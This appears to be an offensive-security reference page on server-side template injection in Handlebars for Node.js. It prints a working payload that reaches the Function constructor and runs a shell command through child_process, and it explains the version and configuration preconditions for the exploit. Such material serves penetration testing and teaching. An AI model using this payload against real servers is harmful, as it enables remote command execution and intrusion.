---
title: "Handlebars server-side template injection"
description: "Exploiting Handlebars SSTI in Node.js: using #with and the constructor.constructor walk to build a Function that calls require('child_process') for command execution."
keywords:
  - Handlebars SSTI
  - constructor.constructor
  - with helper
  - require child_process
---

# Handlebars

Handlebars is deliberately logic-light: it has no inline JavaScript and will not evaluate `{{7*7}}`, so detection relies on the engine's distinctive error output (for example malformed `{{` producing a "Parse error" referencing Handlebars) and on the `{{#if}}`/`{{#with}}` helper syntax being accepted. Despite the restrictions, server-side Handlebars is exploitable because the template can reach an object's `constructor.constructor`, which is JavaScript's `Function` constructor, and use it to compile arbitrary code.

The exploit uses `#with` to pin a reference, walks to `constructor.constructor`, and calls it with a function body that requires `child_process`:

```handlebars
{{#with "s" as |string|}}
  {{#with split as |conslist|}}
    {{this.pop}}
    {{this.push (lookup string.sub "constructor")}}
    {{this.pop}}
    {{#with string.split as |codelist|}}
      {{this.pop}}
      {{this.push "return process.mainModule.require('child_process').execSync('id').toString();"}}
      {{this.pop}}
      {{#each conslist}}
        {{#with (string.sub.apply 0 codelist)}}
          {{this}}
        {{/with}}
      {{/each}}
    {{/with}}
  {{/with}}
{{/with}}
```

The chain reaches `String.prototype.sub`, pulls its `constructor` (the `Function` constructor), and hands it the body to compile and run. Two preconditions decide whether it actually fires.

First, the module-scope detail: a function built by the `Function` constructor runs in the global scope, where `require` is not defined (in CommonJS `require` is module-scoped). The body therefore reaches a loader through the `process` global instead, `process.mainModule.require('child_process')`, rather than a bare `require(...)` that would raise `ReferenceError`.

Second, the prototype-access restriction: since Handlebars 4.6.0 (2020), access to prototype methods and properties is denied by default, which stops this chain while it resolves `split`, `sub`, `pop`, or `constructor`. The payload is reliable only on older releases, or where the application explicitly re-enables prototype access (`allowProtoMethodsByDefault` / `allowProtoPropertiesByDefault`, or a custom `allowedProtoMethods` allowlist). On current Handlebars with default options it does not work merely because attacker-controlled source reaches `Handlebars.compile`.

The baseline precondition still holds: the untrusted input must be compiled as a template (`Handlebars.compile(userInput)`), not passed as data to a fixed template, which is escaped and safe. Confirm the compile-source sink and the Handlebars version/options before investing in the payload.

## Tools

- SSTImap

## References

- Handlebars documentation: helpers, compilation
- PortSwigger Web Security Academy: Server-side template injection
